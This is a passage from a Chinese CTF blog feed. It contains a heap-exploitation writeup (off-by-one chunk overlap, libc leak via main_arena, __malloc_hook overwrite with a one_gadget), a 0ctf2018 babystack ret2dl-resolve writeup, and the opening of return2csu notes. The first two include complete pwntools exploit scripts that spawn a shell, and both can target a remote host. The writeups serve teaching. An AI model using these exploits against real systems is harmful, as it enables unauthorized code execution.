class="comment">#需要用main_arena减去它在libc中的偏移才能得到libc基地址</span></span><br><span class="line"><span class="comment"># 这个偏移可以通过关闭aslr，cat /proc/pid/maps,查看libc的基地址，然后用leak出来main_arena减去这个基地址就得到了偏移。</span></span><br><span class="line">log.info(<span class="string">'[*]libc address:'</span>+hex(libc))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">0</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">5</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">5</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">0</span></span><br><span class="line">view chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[*] [*]main_arena address:<span class="number">0x7f1c45ddab00</span></span><br><span class="line">[*] [*]libc address:<span class="number">0x7f1c45a41000</span></span><br></pre></td></tr></table></figure></p><h3 id="修改top-chunk-覆盖malloc-hook为one-gadaget"><a href="#修改top-chunk-覆盖malloc-hook为one-gadaget" class="headerlink" title="修改top_chunk,覆盖malloc_hook为one_gadaget"></a>修改top_chunk,覆盖malloc_hook为one_gadaget</h3><p>通过改fastbin的fd，从而使得下一次分配的chunk到我们指定的地址（这里是top_chunk上方）。<br>然后修改top_chunk到malloc_hook上方，使得chunk的分配从malloc_chunk的上方附近开始进行。<br>于是下一次分配就分配到malloc_hook上方，从而可以覆盖malloc_hook为one_gadaget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk2 = main_arena - <span class="number">0x33</span> <span class="comment">#在malloc_hook上方附近的地址</span></span><br><span class="line">fake_chunk  = main_arena + <span class="number">32</span> + <span class="number">5</span> <span class="comment">#用来绕过对fd的size大小的检查 </span></span><br><span class="line">fake = alloc(<span class="number">0x48</span>) <span class="comment">#将fake从unsorted bin申请出来</span></span><br><span class="line"></span><br><span class="line">xx = alloc(<span class="number">0x58</span>) <span class="comment">#free后，在fastbin占位，用来绕过对fd的size大小的检查 </span></span><br><span class="line"></span><br><span class="line">delete(xx) <span class="comment">#free后，在fastbin占位，用来绕过对fd的size大小的检查 </span></span><br><span class="line">delete(fake)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x50: fake </span></span><br><span class="line"><span class="string">0x60: xx </span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(fake_chunk)) <span class="comment"># 修改2,将3的fd指向main_arena + 32 + 5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x50: fake --&gt; main_arena + 32 + 5</span></span><br><span class="line"><span class="string">0x60: xx </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># print hex(fake_chunk),hex(fake_chunk2)</span></span><br><span class="line">alloc(<span class="number">0x48</span>) <span class="comment">#将fastbin中的fake再分配出来</span></span><br><span class="line">arena = alloc(<span class="number">0x48</span>)<span class="comment">#alloc main_arena + 32 + 5</span></span><br><span class="line"><span class="keyword">print</span> arena</span><br></pre></td></tr></table></figure><p>需要注意的是main_arena + 32 + 5是什么？<br>还记得我们之前分配并free的xx = alloc(0x58)么？它在fastbin占位，于是它的地址的第一个字节，如图，0x55，正好可以帮我们绕过对于分配fastbin时，对size的验证。<br>这里顺便提一下这个验证：<br>在malloc时会进行一个校验，当size是fastbin的情况下，如果从fastbin取出的第一块chunk的(unsigned long)size不属于该fastbin中的时候就会发生memory corruption(fast)错误。<br>主要检查方式是根据malloc的bytes大小取得index后，到对应的fastbin去找，取出第一块后检查该chunk的size是否属于该fastbin。<br><strong>于是我们的chunk就被分配到了这里！</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-201604.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-201728.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-201552.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update(arena,&quot;\x00&quot;*3 + &quot;\x00&quot;*32 + p64(fake_chunk2)) </span><br><span class="line"># 修改top_chunk为fake_chunk2   用\x00填充fastbins，于是下一次分配将会从我们伪造的top_chunk(fake_chunk2)开始.</span><br><span class="line"># 而伪造的top_chunk刚好就在malloc_hook的上方附近。</span><br><span class="line">winit = alloc(0x48)#从伪造的top_chunk开始分配，从而得到malloc_hook上方的空间的chunk</span><br><span class="line">update(winit,&quot;\x00&quot;*3 + &quot;\x00&quot;*16 + p64(libc + 0x3f35a)) #覆盖__malloc_hook到one_gadget</span><br><span class="line">alloc(0x10,nowait=True) # 触发one_gadget来getshell</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意到我们开始就说过的malloc_state,也就是main_arena它的结构体，可以看到top就在fastbin数组的下面，所以我们malloc出了fastbin数组附近之后，就可以覆盖修改top_chunk了。<br>将top_chunk修改为main_arena-0x33，如图，就在malloc_hook上方。<br>接着就可以分配出这块空间，并且对其修改，覆盖__malloc_hook到one_gadget<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-202858.png" alt=""><br>顺便提一句，寻找one_gadaget可以参考<a href="http://bestwing.me/2016/12/30/one-gadget-rce/" target="_blank" rel="noopener">这篇文章</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># libc = ELF('./libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)   </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:   </span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">alloc</span><span class="params">(size,nowait=False)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nowait:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">res = p.recvuntil(<span class="string">'Allocated\n'</span>)</span><br><span class="line"><span class="comment"># print "alloc chunk:"</span></span><br><span class="line"><span class="comment"># print int(res.split()[1])</span></span><br><span class="line"><span class="keyword">return</span> int(res.split()[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">update</span><span class="params">(idx,content,size=<span class="number">0</span>)</span>:</span></span><br><span class="line">size = size <span class="keyword">if</span> size <span class="keyword">else</span> len(content)</span><br><span class="line">content = content.ljust(size,<span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "update chunk:"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "delete chunk"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "view chunk"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">']: '</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1. Allocate'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="comment"># create(0x18)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># update(0,25,'A'*24+'\x41')</span></span><br><span class="line"><span class="comment"># # gdb.attach(p)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># # delete(0)</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># create(0x30)</span></span><br><span class="line"><span class="comment"># update(1,0x30,'A'*16+p64(0)+p64(0x21)+'\x00'*16)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># # create(0x10)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># view(1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(']: ')</span></span><br><span class="line"><span class="comment"># res = p.recv(48)[32:40]</span></span><br><span class="line"><span class="comment"># heap_base = u64(res)</span></span><br><span class="line">meh  = alloc(<span class="number">0x10</span>)</span><br><span class="line">ovf  = alloc(<span class="number">0x28</span>)</span><br><span class="line">vic  = alloc(<span class="number">0x20</span>)</span><br><span class="line">fake = alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">update(ovf,<span class="string">'a'</span>*<span class="number">0x28</span> + chr(<span class="number">0x51</span>))</span><br><span class="line">update(fake,p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(vic)</span><br><span class="line">bigass = alloc(<span class="number">0x40</span>)</span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">delete(meh)</span><br><span class="line">delete(fake)</span><br><span class="line">heap = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">'[*]heap address:'</span>+hex(heap))</span><br><span class="line">fake = alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))  <span class="comment">#change fake size to 0xd1</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">88</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">xx = alloc(<span class="number">88</span>)</span><br><span class="line">update(xx,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))  </span><br><span class="line"></span><br><span class="line">delete(fake)   <span class="comment"># free small chunk,add to unsort bins,  fd bk point to  unsort bins addr.</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>]) - <span class="number">88</span>     <span class="comment">#compute main_arena addr</span></span><br><span class="line">log.info(<span class="string">'[*]main_arena address:'</span>+hex(main_arena))</span><br><span class="line">libc = main_arena <span class="number">-0x399b00</span></span><br><span class="line">log.info(<span class="string">'[*]libc address:'</span>+hex(libc))</span><br><span class="line">alloc(<span class="number">0x10</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk2 = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk  = main_arena + <span class="number">32</span> + <span class="number">5</span> </span><br><span class="line">fake = alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">xx = alloc(<span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line">delete(xx)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">delete(fake)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(fake_chunk))</span><br><span class="line"><span class="keyword">print</span> hex(fake_chunk),hex(fake_chunk2)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">arena = alloc(<span class="number">0x48</span>)</span><br><span class="line"><span class="keyword">print</span> arena</span><br><span class="line">update(arena,<span class="string">"\x00"</span>*<span class="number">3</span> + <span class="string">"\x00"</span>*<span class="number">32</span> + p64(fake_chunk2))</span><br><span class="line">winit = alloc(<span class="number">0x48</span>)</span><br><span class="line">update(winit,<span class="string">"\x00"</span>*<span class="number">3</span> + <span class="string">"\x00"</span>*<span class="number">16</span> + p64(libc + <span class="number">0x3f35a</span>))</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">    </span><br><span class="line">log.info(<span class="string">'[*]get shell!!!'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-150522.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> overlap </tag>
            
            <tag> off-by-one </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf2018 babystack writeup</title>
      <link href="/2018/04/01/babystack/"/>
      <url>/2018/04/01/babystack/</url>
      <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack</a></p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="ret2dl-in-x86"><a href="#ret2dl-in-x86" class="headerlink" title="ret2dl in x86"></a>ret2dl in x86</h3><p>没有能用来leak的漏洞。<br>如下面的代码,除了明显的栈溢出，没有可以用来leak内存布局，bypass aslr的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulfunc()</span><br><span class="line">&#123;</span><br><span class="line">    char sbuf[10];</span><br><span class="line">    read(0, sbuf, 60);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vulfunc();</span><br><span class="line">    exit(0);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>本来想写一下原理的，不过其他资料已经讲得非常好了，实在没什么可补充的（其实是我还不怎么懂）。<br><a href="https://www.slideshare.net/AngelBoy1/re2dlresolve" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/re2dlresolve</a><br><a href="http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf</a><br><a href="http://skysider.com/?p=416" target="_blank" rel="noopener">http://skysider.com/?p=416</a><br>学习过程中最好找个程序，然后对着_dl_runtime_resolve源码服用，效果更佳，然后再看图就思路清晰了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>alarm用keypatch先nop掉<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092544.png" alt=""><br>可以看出有很明显的栈溢出漏洞，但是只有一个read，没有可以用来leak的函数，所以用ret2dl的解法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092629.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li>通过栈溢出来调用read函数在bss段写我们需要的结构和/bin/sh</li><li>然后使用dl_resolve_call去调用system，得到shell。</li></ol><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># p = remote('202.120.7.202', 6666)</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getReloc</span><span class="params">(elf, base)</span>:</span></span><br><span class="line">    jmprel = elf.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">    relent = elf.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    <span class="keyword">return</span> reloc_offset</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">'./babystack'</span>)</span><br><span class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 : write sh &amp; resolve struct to bss</span></span><br><span class="line">buf1 = <span class="string">'A'</span> * offset <span class="comment">#44</span></span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 : use dl_resolve_call get system &amp; system('/bin/sh')</span></span><br><span class="line">buf3 = <span class="string">'A'</span>*<span class="number">44</span> + rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-091535.png" alt=""></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ret2dl方法是hook师傅教我的，我也没全看懂，只是理解了基本思路后，整个过程用roputils工具来实现的,工具我放在了我的<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/roputils.py" target="_blank" rel="noopener">github</a>上。<br>依然不懂怎么手工构造，而且程序再换成64位也就不会，还要学习一下。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2dl </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>return2csu学习笔记</title>
      <link href="/2018/03/31/return2csu/"/>
      <url>/2018/03/31/return2csu/</url>
      <content type="html"><![CDATA[<h2 id="议题下载链接"><a href="#议题下载链接" class="headerlink" title="议题下载链接"></a>议题下载链接</h2><p><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf</a><br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p><h3 id="ASLR简述"><a href="#ASLR简述" class="headerlink" title="ASLR简述"></a>ASLR简述</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-084818.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-084852.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-090234.png" alt=""></p><p>由于程序的堆、栈分配与共享库的装载都是在运行时进行, 系统在程序每次执行时, <strong>随机地分配程序堆栈的地址以及共享库装载的地址</strong>。尽管它们之间的相对位置没有改变, 但每次执行的差异仍然是页级的, 攻击者将无法预测自己写入的数据区的确切虚拟地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-090311.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-090517.png" alt=""></p><h3 id="The-Attached-code"><a href="#The-Attached-code" class="headerlink" title="The Attached code"></a>The Attached code</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-091057.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-31-090925.png" alt=""><br>我只写了一个main函数，那其他的函数是怎么来的呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 